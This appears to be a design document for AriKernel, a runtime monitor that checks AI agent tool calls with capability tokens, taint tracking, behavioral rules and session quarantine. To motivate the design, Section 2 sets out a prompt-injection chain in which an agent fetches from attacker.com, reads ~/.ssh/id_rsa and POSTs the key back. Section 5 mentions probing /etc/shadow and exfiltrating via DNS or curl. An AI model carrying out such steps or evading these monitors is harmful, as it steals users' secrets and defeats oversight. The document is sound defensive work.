# The Agent Reference Monitor Model

A technical design document describing the security model implemented by AriKernel.

---

## 1. The Ambient Authority Problem

AI agents interact with the world through tools: HTTP clients, shell commands, file I/O, database queries. In most deployments, these tools run with the full permissions of the host process. An agent that can call an HTTP endpoint can call _any_ HTTP endpoint. An agent with file access can read _any_ file the process can reach. There is no permission boundary between "the model decided to call a function" and "the function executed."

This is the **ambient authority problem**. The agent inherits all capabilities of its runtime environment by default, rather than receiving explicitly scoped grants for specific operations.

System prompts and prompt-level instructions are sometimes treated as security boundaries. They are not. A system prompt is advisory text processed by the same language model that processes adversarial input. The model can be manipulated into ignoring it — through prompt injection, context overflow, or simply ambiguous instructions. More fundamentally, a system prompt has no enforcement mechanism. It cannot prevent a tool call from executing. It can only suggest that the model should not make the call, and the model may disagree.

The result: an AI agent operating with ambient authority is one successful prompt injection away from unrestricted tool access. The attack surface is not the model's reasoning — it is the absence of an enforcement boundary between reasoning and execution.

---

## 2. Why Per-Call Gateways Fail

The obvious response to the ambient authority problem is a gateway: intercept each tool call and apply an allow/deny decision based on static rules. Block calls to sensitive paths. Restrict HTTP to allowlisted domains. Deny shell commands entirely.

Per-call gateways fail because they evaluate each action independently. They have no memory across calls and no concept of data provenance.

Consider a three-step attack sequence:

1. **Fetch a webpage** — `GET https://attacker.com/payload`. The gateway allows it: HTTP GET is permitted, and the domain is not blocklisted.
2. **Read SSH keys** — `file.read ~/.ssh/id_rsa`. The gateway allows it: the agent has file read capabilities, and this path is not explicitly restricted.
3. **Exfiltrate** — `POST https://attacker.com/collect` with the SSH key contents in the body. The gateway allows it: HTTP POST is permitted, and the domain passed the first check.

Each call is individually legitimate. Only the _sequence_ is adversarial — and the gateway cannot see sequences. It does not know that the POST payload contains data from step 2, fetched as a consequence of instructions injected in step 1. It evaluates each call in isolation, which is exactly what the attacker needs.

To detect this attack, the enforcement layer must track data provenance (the POST body originates from a tainted web fetch), recognize behavioral patterns (taint → sensitive read → egress), and make decisions based on cumulative session state, not individual calls.

---

## 3. The Agent Reference Monitor Model

A **reference monitor** is a security concept from operating system design (Anderson, 1972). It defines an enforcement boundary with three properties:

1. **Always invoked** — every access request passes through the monitor. There is no way to bypass it.
2. **Tamper-proof** — the monitor cannot be modified by the subjects it governs.
3. **Verifiable** — the monitor is small enough to be subjected to rigorous analysis.

AriKernel applies this concept to AI agent runtimes. It is a reference monitor that interposes on every tool call an agent makes, evaluating four dimensions before allowing execution:

- **Capability tokens** — Does the agent hold a valid, unexpired token that grants permission for this specific operation?
- **Data provenance** — Does the tool call involve data from untrusted sources? Do taint labels on the call match policy restrictions?
- **Behavioral patterns** — Does the recent sequence of events match a known attack pattern?
- **Run-level state** — Has the session accumulated enough suspicious activity to warrant restricted mode?

Only if all four checks pass does the tool call proceed to execution. The decision — allow, deny, or quarantine — is recorded in a tamper-evident audit log before the result is returned to the agent.

This is not a prompt filter. It does not inspect the model's text output. It operates on typed, schema-validated tool calls at the execution boundary. The agent cannot reason its way around it, because the enforcement happens after reasoning and before execution.

---

## 4. Enforcement Layers

AriKernel implements five enforcement layers. Each layer operates independently; a tool call must satisfy all of them.

### Layer 1: Capability Tokens

Agents do not receive ambient tool access. Instead, they request **short-lived capability tokens** scoped to a specific tool class (HTTP, file, shell, database), constrained by path patterns and host allowlists, and bounded by a TTL (default: 5 minutes) and a usage lease (default: 10 calls). A token for `file.read` on `/var/data/**` does not grant `file.write`, does not apply to `/etc/`, and expires after its TTL regardless of remaining uses.

Tokens are evaluated independently per request. Holding an HTTP token does not influence the evaluation of a file token request. There is no privilege escalation path through token accumulation.

### Layer 2: Taint and Provenance Tracking

Every tool call can carry **taint labels** indicating data provenance: `web`, `rag`, `email`, or other source identifiers. Taint propagates forward through tool call chains — if a call's output is used as input to a subsequent call, the downstream call inherits the upstream taint.

Policies can condition on taint. A taint-aware rule can deny file writes when the call carries a `web` taint label, or block capability issuance for `shell` when the requesting context includes data from an untrusted source. This is provenance-aware enforcement: the decision depends not just on what the agent is doing, but on where the data came from.

### Layer 3: Behavioral Sequence Detection

A **recent-event window** (bounded at 20 events) tracks normalized security events across the session: `capability_requested`, `tool_call_allowed`, `taint_observed`, `sensitive_read_attempt`, `egress_attempt`, and others.

Three built-in behavioral rules evaluate patterns in this window:

| Rule | Pattern | Detects |
|------|---------|---------|
| `web_taint_sensitive_probe` | `taint_observed(web)` → `sensitive_read_attempt` | Prompt injection → data access |
| `denied_capability_then_escalation` | `capability_denied` → `capability_requested(higher risk)` | Privilege escalation probing |
| `sensitive_read_then_egress` | `sensitive_read_attempt` → `egress_attempt` | Data staging → exfiltration |

Rules are evaluated after every security event. The first matching rule triggers immediately — the system does not wait for threshold counters or batch evaluation.

### Layer 4: Run-Level Behavioral Quarantine

When a behavioral rule matches — or when denial counters exceed a configured threshold — the run enters **restricted mode**. This is run-level behavioral quarantine: the entire session is locked to read-only operations. Only safe actions pass through (`http.get`, `file.read`, `database.query`). Write, execute, and escalation attempts are denied for the remainder of the session.

Quarantine is immediate and irrecoverable within the run. The design principle is containment: a compromised agent session should be isolated, not rehabilitated. The agent cannot retry, escalate, or pivot to alternative exfiltration paths.

### Layer 5: Replayable Tamper-Evident Audit

Every decision — allow, deny, quarantine — is recorded in a **SHA-256 hash-chained event store**. Each event's hash includes the hash of the previous event, forming a tamper-evident chain. Any modification, deletion, or insertion of events breaks the chain and is detected on replay.

Quarantine events are first-class audit records. They include structured metadata: trigger type (behavioral rule or threshold), rule ID, reason, counters snapshot, matched events, and timestamp. This is replayable audit evidence — not just logging, but a cryptographically verifiable record of what happened, what triggered it, and why.

---

## 5. Behavioral Quarantine as a Design Principle

Blocking individual tool calls is necessary but not sufficient. An agent that is denied one action will try another. A prompt injection that fails to read `/etc/passwd` will attempt `/etc/shadow`. An exfiltration attempt blocked on HTTP POST will try DNS or shell `curl`.

Per-call denial creates an arms race between the attacker (who controls the agent's reasoning) and the gateway (which evaluates each attempt independently). The attacker has the advantage: they can generate arbitrary variations, while the gateway needs an explicit rule for each one.

Run-level behavioral quarantine breaks this dynamic. Instead of playing whack-a-mole with individual calls, the system detects the _intent_ — the behavioral sequence that reveals adversarial control — and contains the entire session.

The quarantine decision produces a `QuarantineInfo` record containing: the trigger type (`behavioral_rule` or `threshold`), the specific rule ID that matched, a human-readable reason, a snapshot of the run's counters at the time of quarantine, and the list of matched events that formed the pattern. This structured evidence makes the quarantine decision auditable and explainable.

---

## 6. Replayable Evidence

The audit log is not a convenience feature. It is a structural component of the security model.

Each audit event contains: a sequence number, the tool call (class, method, parameters), the principal ID, the decision (allow, deny, quarantine with reason), taint labels, a timestamp, and a SHA-256 hash that chains to the previous event. The hash chain means that any tampering — modifying an event, deleting an event, inserting a fabricated event — is detectable.

The CLI `replay` command reads the audit store and renders the full decision history. It verifies the hash chain on every replay. For quarantine events, it displays the trigger type, rule ID, reason, and matched event pattern.

This produces forensic-grade evidence. After an incident, an operator can reconstruct exactly what the agent did, what data it accessed, when the behavioral rule fired, and what was blocked after quarantine — all verified by the hash chain. The audit trail answers not just "what happened" but "why did the system respond this way."

---

## 7. Architecture

```
┌─────────┐
│  Agent   │
└────┬─────┘
     │ tool call
     ▼
┌──────────────────────────────────┐
│       AriKernel             │
│                                  │
│  ┌─ capability token check       │
│  ├─ taint / provenance check     │
│  ├─ policy evaluation            │
│  ├─ behavioral rule evaluation   │
│  └─ audit log append             │
│                                  │
│  Run State: counters, events,    │
│  quarantine status               │
└────┬─────────────────────────────┘
     │ allowed call
     ▼
┌─────────┐
│  Tools   │
│  (HTTP, File, Shell, Database)   │
└─────────┘
```

The firewall is a **synchronous intercept**. The agent blocks until the firewall returns a decision. There is no asynchronous path that bypasses enforcement. The tool call is either allowed (and executed), denied (and returned with an error), or quarantined (and all subsequent non-read-only calls denied).

The firewall is a library, not a proxy. It runs in the same process as the agent, wrapping tool execution functions. This ensures the "always invoked" property: tool calls cannot reach executors without passing through the enforcement pipeline.

---

## 8. Relationship to Existing Security Models

AriKernel draws from three established security traditions.

### The OS Reference Monitor (Anderson, 1972)

James Anderson's reference monitor concept defined the requirements for a trusted enforcement boundary in operating systems: complete mediation (every access is checked), isolation (the monitor is tamper-proof), and verifiability (the monitor is small enough to analyze). AriKernel applies these requirements to the AI agent context. Every tool call is mediated. The enforcement logic runs outside the model's control. The pipeline is a bounded, auditable code path.

### The Browser Sandbox

Web browsers enforce security through origin-based isolation, content security policies, and the same-origin policy. A script from `attacker.com` cannot read cookies from `bank.com` — not because the script chooses not to, but because the browser enforces a boundary. AriKernel provides an analogous boundary for AI agents: taint labels function like origins, capability tokens function like permissions, and quarantine functions like revoking a tab's access to privileged APIs.

### Capability-Based Security (Dennis & Van Horn, 1966)

In capability-based systems, subjects hold explicit tokens that grant specific permissions. There is no ambient authority — a process cannot access a resource unless it holds a capability for that resource. AriKernel implements this model for AI agents: capability tokens are unforgeable, time-bounded, scope-limited grants. An agent without a valid token for `shell.exec` cannot execute shell commands, regardless of what the language model decides.

### Convergence

AriKernel is a reference monitor for AI agent runtimes that combines complete mediation with capability-based access control and behavioral sequence detection. The first two are established principles adapted to a new context. The third — detecting adversarial intent through multi-step behavioral patterns and quarantining the session — is specific to the problem of AI agents operating under potentially adversarial control.
